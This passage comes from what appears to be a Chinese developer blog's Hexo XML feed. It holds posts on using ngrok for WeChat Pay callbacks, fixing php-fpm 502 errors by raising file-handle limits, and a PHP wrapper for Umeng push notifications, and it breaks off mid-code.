class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parent:: <span class="variable">$country</span></span><br><span class="line">parent:: myCountry()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>内网穿透神器ngrok</title>
      <link href="/ngrok.html"/>
      <url>/ngrok.html</url>
      <content type="html"><![CDATA[<p>之前在做微信支付开发的时候，就会遇到需要微信的服务器连接本地的系统，这时候就需要内网穿透神器ngrok</p><p>ngrok官网：<a href="https://ngrok.com/" target="_blank" rel="noopener">https://ngrok.com/</a></p><p>启动ngrok</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ngrok http 80</span><br></pre></td></tr></table></figure><p>之后就可以使用<br><a href="http://127.0.0.1:4040" target="_blank" rel="noopener">http://127.0.0.1:4040</a><br>访问<br>首页会显示你的临时域名</p><p>再配置回调地址，nginx虚拟域名设置就可以了</p>]]></content>
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ngrok </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php-fpm warning 进程退出问题</title>
      <link href="/php-fpm_warning.html"/>
      <url>/php-fpm_warning.html</url>
      <content type="html"><![CDATA[<p>最近VPS总是出现 Nginx 502 Bad Gateway 错误，导致网页无法正常访问，但FTP和SSH正常连接，很是伤脑筋！这次好好整治一下！</p><p>根据问题，应该是 php-fpm 出了问题，先查看日志文件 /usr/local/php/logs/php-fpm.log</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[25-Sep-2017 14:13:42] WARNING: [pool www] child 4467 exited on signal 15 (SIGTERM) after 344743.168205 seconds from start</span><br><span class="line">[25-Sep-2017 14:13:42] NOTICE: [pool www] child 4698 started</span><br><span class="line">[25-Sep-2017 14:17:02] WARNING: [pool www] child 25731, script <span class="string">'/data/wwwroot/myxz/public/admin.php'</span> (request: <span class="string">"GET /admin.php"</span>) execution timed out (121.574793 sec), terminating</span><br><span class="line">[25-Sep-2017 14:17:02] WARNING: [pool www] child 25731 exited on signal 15 (SIGTERM) after 29334.308572 seconds from start</span><br><span class="line">[25-Sep-2017 14:17:02] NOTICE: [pool www] child 4875 started</span><br><span class="line">[25-Sep-2017 14:19:49] WARNING: [pool www] child 26830, script <span class="string">'/data/wwwroot/myxz/public/admin.php'</span> (request: <span class="string">"GET /admin.php"</span>) execution timed out (107.783786 sec), terminating</span><br></pre></td></tr></table></figure><p>满眼的NOTICE错误，据观察至后几天，错误日志都是如此！据网络资料分析说，这类错误大都是由于php线程打开文件句柄受限导致的错误，这里综合各位童鞋的分析，整理记录如下，希望能解决此类 502 问题！</p><p>首先检查一下ulimit -n的值，SSH输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -n</span><br></pre></td></tr></table></figure><p>返回：65535</p><ul><li>提升服务器的文件句柄打开</li></ul><p>SSH命令：# vi /etc/security/limits.conf，在结尾处添加以下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* soft nofile 65535</span><br><span class="line">* hard nofile 65535</span><br></pre></td></tr></table></figure><ul><li>提升nginx的进程文件打开数<br>vi /usr/local/nginx/conf/nginx.conf<br>查看 </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worker_rlimit_nofile 51200;</span><br></pre></td></tr></table></figure><ul><li>修改 php-fpm.conf 配置文件</li></ul><p>前面确认了 ulimit -n 值为 65535，/usr/local/php/etc/php-fpm.conf 中的选项 rlimit_files 确保和此数值一致。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pm.max_requests = 10240</span><br><span class="line">rlimit_files = 65535</span><br></pre></td></tr></table></figure><ul><li>修改 sysctl.conf<br>vi /etc/sysctl.conf<br>底部添加</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fs.file-max=65535</span><br></pre></td></tr></table></figure><p>至此，重启 /root/lnmp restart 生效，看看还有没有类似错误信息出现！</p><p>ps.为减小php-fpm.log文件大小，可将 /usr/local/php/etc/php-fpm.conf 中的 Log level 由 notice 修改为 ERROR，这样能降低日志的生成速度！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log_level = ERROR</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php友盟推送</title>
      <link href="/php-umeng.html"/>
      <url>/php-umeng.html</url>
      <content type="html"><![CDATA[<h2 id="友盟推送"><a href="#友盟推送" class="headerlink" title="友盟推送"></a>友盟推送</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>友盟推送官方<a href="https://www.umeng.com/codecenter.html" target="_blank" rel="noopener">服务端demo</a></p><p>项目背景，服务催促推送，订单消息推送</p><p>话不多说，开始</p><h3 id="友盟app推送"><a href="#友盟app推送" class="headerlink" title="友盟app推送"></a>友盟app推送</h3><ul><li>友盟demo修改，改动的地方较少</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace umeng;</span><br><span class="line"></span><br><span class="line">class Umeng&#123;</span><br><span class="line">protected <span class="variable">$appkey</span>           = NULL; </span><br><span class="line">protected <span class="variable">$appMasterSecret</span>     = NULL;</span><br><span class="line">protected <span class="variable">$timestamp</span>        = NULL;</span><br><span class="line">protected <span class="variable">$validation_token</span> = NULL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> __construct(<span class="variable">$arr</span>) &#123;</span><br><span class="line"></span><br><span class="line">require_once EXTEND_PATH.<span class="string">'umeng\android\AndroidBroadcast.php'</span>;</span><br><span class="line">require_once EXTEND_PATH.<span class="string">'umeng\android\AndroidFilecast.php'</span>;</span><br><span class="line">require_once EXTEND_PATH.<span class="string">'umeng\android\AndroidGroupcast.php'</span>;</span><br><span class="line">require_once EXTEND_PATH.<span class="string">'umeng\android\AndroidUnicast.php'</span>;</span><br><span class="line">require_once EXTEND_PATH.<span class="string">'umeng\android\AndroidCustomizedcast.php'</span>;</span><br><span class="line">require_once EXTEND_PATH.<span class="string">'umeng\ios\IOSBroadcast.php'</span>;</span><br><span class="line">require_once EXTEND_PATH.<span class="string">'umeng\ios\IOSFilecast.php'</span>;</span><br><span class="line">require_once EXTEND_PATH.<span class="string">'umeng\ios\IOSGroupcast.php'</span>;</span><br><span class="line">require_once EXTEND_PATH.<span class="string">'umeng\ios\IOSUnicast.php'</span>;</span><br><span class="line">require_once EXTEND_PATH.<span class="string">'umeng\ios\IOSCustomizedcast.php'</span>;</span><br><span class="line"></span><br><span class="line">//设备配置</span><br><span class="line"><span class="variable">$this</span>-&gt;appkey = empty(<span class="variable">$arr</span>[<span class="string">'appkey'</span>])?<span class="string">''</span>:<span class="variable">$arr</span>[<span class="string">'appkey'</span>];</span><br><span class="line"><span class="variable">$this</span>-&gt;appMasterSecret = empty(<span class="variable">$arr</span>[<span class="string">'appMasterSecret'</span>])?<span class="string">''</span>:<span class="variable">$arr</span>[<span class="string">'appMasterSecret'</span>];</span><br><span class="line"><span class="variable">$this</span>-&gt;timestamp = strval(time());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 广播(broadcast): 向安装该App的所有设备发送消息。</span><br><span class="line"> * <span class="variable">$tiker</span>     通知栏提示文字</span><br><span class="line"> * <span class="variable">$title</span>     通知标题</span><br><span class="line"> * <span class="variable">$text</span>      通知文字描述</span><br><span class="line"> * <span class="variable">$after_open</span>   点击<span class="string">"通知"</span>的后续行为，<span class="string">"go_app"</span>: 打开应用</span><br><span class="line">                                   <span class="string">"go_url"</span>: 跳转到URL</span><br><span class="line">                                   <span class="string">"go_activity"</span>: 打开特定的activity</span><br><span class="line">                                   <span class="string">"go_custom"</span>: 用户自定义内容。</span><br><span class="line">       <span class="variable">$after_val</span>   选填        after_open 后续操作参数</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> sendAndroidBroadcast(<span class="variable">$ticker</span>,<span class="variable">$title</span>,<span class="variable">$text</span>,<span class="variable">$after_open</span>,<span class="variable">$after_val</span>=<span class="string">''</span>) &#123;</span><br><span class="line">    <span class="variable">$result</span> = array(<span class="string">'stauts'</span>=&gt;<span class="literal">false</span>,<span class="string">'msg'</span>=&gt;<span class="string">''</span>,);</span><br><span class="line">try &#123;</span><br><span class="line"><span class="variable">$brocast</span> = new \AndroidBroadcast();</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setAppMasterSecret(<span class="variable">$this</span>-&gt;appMasterSecret);</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"appkey"</span>,  <span class="variable">$this</span>-&gt;appkey);</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"timestamp"</span>,<span class="variable">$this</span>-&gt;timestamp);</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"ticker"</span>,   <span class="variable">$ticker</span>);   // 必填 通知栏提示文字</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"title"</span>,    <span class="variable">$title</span>);    // 必填 通知标题</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"text"</span>,     <span class="variable">$text</span>);</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"after_open"</span>,<span class="variable">$after_open</span>);</span><br><span class="line"></span><br><span class="line">switch (<span class="variable">$after_open</span>)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'go_url'</span>:</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"url"</span>,       <span class="variable">$after_val</span>);</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'go_activity'</span>:</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"activity"</span>,  <span class="variable">$after_val</span>);</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">// Set <span class="string">'production_mode'</span> to <span class="string">'false'</span> <span class="keyword">if</span> it<span class="string">'s a test device. </span></span><br><span class="line"><span class="string">// For how to register a test device, please see the developer doc.</span></span><br><span class="line"><span class="string">$brocast-&gt;setPredefinedKeyValue("production_mode", "true");</span></span><br><span class="line"><span class="string">// [optional]Set extra fields</span></span><br><span class="line"><span class="string">//$brocast-&gt;setExtraField("test", "helloworld");</span></span><br><span class="line"><span class="string">// print("Sending broadcast notification, please wait...\r\n");</span></span><br><span class="line"><span class="string">$result['</span>msg<span class="string">'] = $brocast-&gt;send();</span></span><br><span class="line"><span class="string">$result['</span>stauts<span class="string">'] = true;</span></span><br><span class="line"><span class="string">            return $result;</span></span><br><span class="line"><span class="string">&#125; catch (\Exception $e) &#123;</span></span><br><span class="line"><span class="string">    $result['</span>msg<span class="string">'] = $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">    return $result;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * 单播(unicast): 向指定的设备发送消息，包括向单个device_token或者单个alias发消息。</span></span><br><span class="line"><span class="string"> * $device_token  设备唯一表示</span></span><br><span class="line"><span class="string"> * $tiker     通知栏提示文字</span></span><br><span class="line"><span class="string"> * $title     通知标题</span></span><br><span class="line"><span class="string"> * $text      通知文字描述</span></span><br><span class="line"><span class="string"> * $custom    自定义内容</span></span><br><span class="line"><span class="string"> * $after_open   点击"通知"的后续行为，"go_app": 打开应用</span></span><br><span class="line"><span class="string">                                   "go_url": 跳转到URL</span></span><br><span class="line"><span class="string">                                   "go_activity": 打开特定的activity</span></span><br><span class="line"><span class="string">                                   "go_custom": 用户自定义内容。</span></span><br><span class="line"><span class="string">       $after_val   选填        after_open 后续操作参数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">function sendAndroidUnicast($device_token,$text,$custom,$ticker='</span>XXX<span class="string">',$title='</span>XXX<span class="string">',$after_open='</span><span class="string">',$after_val='</span><span class="string">') &#123;</span></span><br><span class="line"><span class="string">    $result = array('</span>stauts<span class="string">'=&gt;false,'</span>msg<span class="string">'=&gt;'</span><span class="string">',);</span></span><br><span class="line"><span class="string">    try &#123;</span></span><br><span class="line"><span class="string">$unicast = new \AndroidUnicast();</span></span><br><span class="line"><span class="string">$unicast-&gt;setAppMasterSecret($this-&gt;appMasterSecret);</span></span><br><span class="line"><span class="string">$unicast-&gt;setPredefinedKeyValue("appkey",           $this-&gt;appkey);</span></span><br><span class="line"><span class="string">$unicast-&gt;setPredefinedKeyValue("timestamp",        $this-&gt;timestamp);</span></span><br><span class="line"><span class="string">// Set your device tokens here</span></span><br><span class="line"><span class="string">$unicast-&gt;setPredefinedKeyValue("device_tokens",    $device_token); </span></span><br><span class="line"><span class="string">$unicast-&gt;setPredefinedKeyValue("ticker",           $ticker);</span></span><br><span class="line"><span class="string">$unicast-&gt;setPredefinedKeyValue("title",            $title);</span></span><br><span class="line"><span class="string">$unicast-&gt;setPredefinedKeyValue("text",             $text);</span></span><br><span class="line"><span class="string">$unicast-&gt;setPredefinedKeyValue("after_open",       $after_open);</span></span><br><span class="line"><span class="string">$unicast-&gt;setPredefinedKeyValue("custom",$custom);</span></span><br><span class="line"><span class="string">switch ($after_open)&#123;</span></span><br><span class="line"><span class="string">case '</span>go_url<span class="string">':</span></span><br><span class="line"><span class="string">        $unicast-&gt;setPredefinedKeyValue("url",       $after_val);</span></span><br><span class="line"><span class="string">        break;</span></span><br><span class="line"><span class="string">    case '</span>go_activity<span class="string">':</span></span><br><span class="line"><span class="string">        $unicast-&gt;setPredefinedKeyValue("activity",  $after_val);</span></span><br><span class="line"><span class="string">        break;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">// Set '</span>production_mode<span class="string">' to '</span><span class="literal">false</span><span class="string">' if it'</span>s a <span class="built_in">test</span> device. </span><br><span class="line">// For how to register a <span class="built_in">test</span> device, please see the developer doc.</span><br><span class="line"><span class="variable">$checkArr</span> = <span class="variable">$unicast</span>-&gt;setPredefinedKeyValue(<span class="string">"production_mode"</span>, <span class="string">"false"</span>);</span><br><span class="line">        <span class="variable">$sendArr</span> = json_decode(<span class="variable">$unicast</span>-&gt;send(),<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$sendArr</span>[<span class="string">'ret'</span>]!=<span class="string">'SUCCESS'</span>)&#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="string">'msg'</span>] = <span class="string">"推送失败，错误码"</span>.<span class="variable">$sendArr</span>[<span class="string">'data'</span>][<span class="string">'error_code'</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="string">'stauts'</span>] = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable">$result</span>[<span class="string">'msg'</span>]=<span class="string">"推送成功"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125; catch (\Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">'msg'</span>] = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * IOS广播(broadcast): 向安装该App的所有设备发送消息。</span><br><span class="line"> * <span class="variable">$alert</span>  内容</span><br><span class="line"> */</span><br><span class="line"><span class="keyword">function</span> sendIOSBroadcast(<span class="variable">$alert</span>) &#123;</span><br><span class="line">    <span class="variable">$result</span> = array(<span class="string">'stauts'</span>=&gt;<span class="literal">false</span>,<span class="string">'msg'</span>=&gt;<span class="string">''</span>,);</span><br><span class="line">try &#123;</span><br><span class="line"><span class="variable">$brocast</span> = new \IOSBroadcast();</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setAppMasterSecret(<span class="variable">$this</span>-&gt;appMasterSecret);</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"appkey"</span>,           <span class="variable">$this</span>-&gt;appkey);</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"timestamp"</span>,        <span class="variable">$this</span>-&gt;timestamp);</span><br><span class="line"></span><br><span class="line"><span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"alert"</span>, <span class="variable">$alert</span>);</span><br><span class="line">//<span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"badge"</span>, 0);</span><br><span class="line">//<span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"sound"</span>, <span class="string">"chime"</span>);</span><br><span class="line">// Set <span class="string">'production_mode'</span> to <span class="string">'true'</span> <span class="keyword">if</span> your app is under production mode</span><br><span class="line"><span class="variable">$brocast</span>-&gt;setPredefinedKeyValue(<span class="string">"production_mode"</span>, <span class="string">"true"</span>);</span><br><span class="line">// Set customized fields</span><br><span class="line">//<span class="variable">$brocast</span>-&gt;setCustomizedField(<span class="string">"test"</span>, <span class="string">"helloworld"</span>);</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Sending broadcast notification, please wait...\r\n"</span>);</span><br><span class="line">            <span class="variable">$result</span>[<span class="string">'msg'</span>] = <span class="variable">$brocast</span>-&gt;send();</span><br><span class="line"><span class="variable">$result</span>[<span class="string">'stauts'</span>] = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125; catch (\Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">'msg'</span>] = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 单播(unicast): 向指定的设备发送消息，包括向单个device_token或者单个<span class="built_in">alias</span>发消息。</span><br><span class="line"> * <span class="variable">$device_tokens</span>   设备唯一表示</span><br><span class="line"> * <span class="variable">$alert</span>      内容</span><br><span class="line"> * <span class="variable">$custom</span>     自定义内容</span><br><span class="line"> */</span><br><span class="line"><span class="keyword">function</span> sendIOSUnicast(<span class="variable">$device_tokens</span>,<span class="variable">$alert</span>,<span class="variable">$custom</span>) &#123;</span><br><span class="line">    <span class="variable">$result</span> = array(<span class="string">'stauts'</span>=&gt;<span class="literal">false</span>,<span class="string">'msg'</span>=&gt;<span class="string">''</span>,);</span><br><span class="line">try &#123;</span><br><span class="line"><span class="variable">$unicast</span> = new \IOSUnicast();</span><br><span class="line"><span class="variable">$unicast</span>-&gt;setAppMasterSecret(<span class="variable">$this</span>-&gt;appMasterSecret);</span><br><span class="line"><span class="variable">$unicast</span>-&gt;setPredefinedKeyValue(<span class="string">"appkey"</span>,           <span class="variable">$this</span>-&gt;appkey);</span><br><span class="line"><span class="variable">$unicast</span>-&gt;setPredefinedKeyValue(<span class="string">"timestamp"</span>,        <span class="variable">$this</span>-&gt;timestamp);</span><br><span class="line">// Set your device tokens here</span><br><span class="line"><span class="variable">$unicast</span>-&gt;setPredefinedKeyValue(<span class="string">"device_tokens"</span>,    <span class="variable">$device_tokens</span>); </span><br><span class="line"><span class="variable">$unicast</span>-&gt;setPredefinedKeyValue(<span class="string">"alert"</span>, <span class="variable">$alert</span>);</span><br><span class="line"><span class="variable">$unicast</span>-&gt;setPredefinedKeyValue(<span class="string">"badge"</span>, 0);</span><br><span class="line"><span class="variable">$unicast</span>-&gt;setPredefinedKeyValue(<span class="string">"sound"</span>, <span class="string">"chime"</span>);</span><br><span class="line"></span><br><span class="line">// Set <span class="string">'production_mode'</span> to <span class="string">'true'</span> <span class="keyword">if</span> your app is under production mode</span><br><span class="line"><span class="variable">$unicast</span>-&gt;setPredefinedKeyValue(<span class="string">"production_mode"</span>, <span class="string">"false"</span>);</span><br><span class="line"></span><br><span class="line">// Set customized fields</span><br><span class="line"><span class="variable">$unicast</span>-&gt;setCustomizedField(<span class="string">"custom"</span>,<span class="variable">$custom</span>);</span><br><span class="line">//<span class="variable">$unicast</span>-&gt;setCustomizedField(<span class="string">"test"</span>, <span class="string">"helloworld"</span>);</span><br><span class="line"><span class="variable">$sendArr</span> = json_decode(<span class="variable">$unicast</span>-&gt;send(),<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$sendArr</span>[<span class="string">'ret'</span>]!=<span class="string">'SUCCESS'</span>)&#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="string">'msg'</span>] = <span class="string">"推送失败，错误码"</span>.<span class="variable">$sendArr</span>[<span class="string">'data'</span>][<span class="string">'error_code'</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="string">'stauts'</span>] = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable">$result</span>[<span class="string">'msg'</span>]=<span class="string">"推送成功"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125; catch (\Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">'msg'</span>] = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>业务需求，重点对单推作修改</p><h4 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h4><ul><li>点对点推送</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* @desc: 点对点推送--支持两个以上的设备</span><br><span class="line">* @param: <span class="variable">$userIds</span> 用户ID</span><br><span class="line">* @param: <span class="variable">$title</span> 推送的标题</span><br><span class="line">* @param: <span class="variable">$custom</span> 自定义参数</span><br><span class="line">* @<span class="built_in">return</span> boolear 是否成功</span><br><span class="line">*/    </span><br><span class="line">public <span class="keyword">function</span> doPush(<span class="variable">$userIds</span>,<span class="variable">$title</span>,<span class="variable">$custom</span> = array())&#123;</span><br><span class="line">try &#123;</span><br><span class="line"><span class="keyword">if</span> (empty(<span class="variable">$title</span>))&#123;</span><br><span class="line"><span class="built_in">return</span> array(<span class="string">'code'</span>=&gt;<span class="string">'1001'</span>,<span class="string">'msg'</span>=&gt;<span class="string">'推送信息标题不能为空'</span>);</span><br><span class="line">&#125; </span><br><span class="line">        通过用户ID获取用的device_token</span><br><span class="line">/**</span><br><span class="line">* 推送设备device_tokens获取</span><br><span class="line">foreach (<span class="variable">$device_tokens</span> as <span class="variable">$device_token</span>)&#123;</span><br><span class="line">                // 判断device_token  64位表示为苹果 否则为安卓</span><br><span class="line">                <span class="keyword">if</span>(strlen(<span class="variable">$device_token</span>) == 64)&#123;</span><br><span class="line">                    <span class="variable">$data</span>[<span class="string">'ios_device_tokens'</span>] .= <span class="variable">$device_token</span>.<span class="string">','</span>;  </span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$data</span>[<span class="string">'android_device_tokens'</span>] .= <span 